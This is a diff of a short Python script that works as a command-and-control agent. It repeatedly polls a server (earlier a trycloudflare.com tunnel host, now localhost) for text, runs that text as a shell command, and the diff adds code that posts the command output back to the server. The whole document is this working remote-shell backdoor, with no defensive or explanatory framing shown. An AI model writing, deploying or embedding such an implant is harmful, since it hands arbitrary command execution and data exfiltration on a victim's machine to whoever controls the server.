@@ -2,26 +2,42 @@ import requests
 import time
 import subprocess
 
-session = requests.Session()  # use a session to enable connection reuse (keep-alive)
+# Setup session for keep-alive
+session = requests.Session()
 
 while True:
     try:
-        req = session.get("https://ia-margaret-wed-bloomberg.trycloudflare.com/home")
+        
+        req = session.get("http://127.0.0.1:8080/home")
     except requests.exceptions.RequestException:
-        # If server not ready or connection interrupted, just skip this iteration
+        
         continue
 
-    # Print response
-    print(req.status_code)
-    print(req.text)
+    # Print server response
+    print("GET /home ->", req.status_code)
+    print("Command from server:", repr(req.text))
 
-    # Use the text in subprocess
+    # Step 2: Run the command if not empty
     command = req.text.strip()
     if command:
         try:
-            subprocess.run(command, shell=True)
+            print("Running command:", command)
+            result = subprocess.run(command, shell=True, capture_output=True, text=True)
+
+            # Combine stdout and stderr
+            output = result.stdout + "\n" + result.stderr
+            print("Command output:\n", output)
+
+            # Step 3: Send result back to server
+            data = {
+                "Result": output
+            }
+
+            resp = session.post("http://127.0.0.1:8080/home2", data=data, timeout=0.1)
+            print("POST /home2 ->", resp.status_code)
+
         except Exception as e:
             print(f"Error running command: {e}")
 
-    # Optional: small delay to avoid flooding the server too fast
+    # Small delay to avoid flooding the server
     time.sleep(0.5)
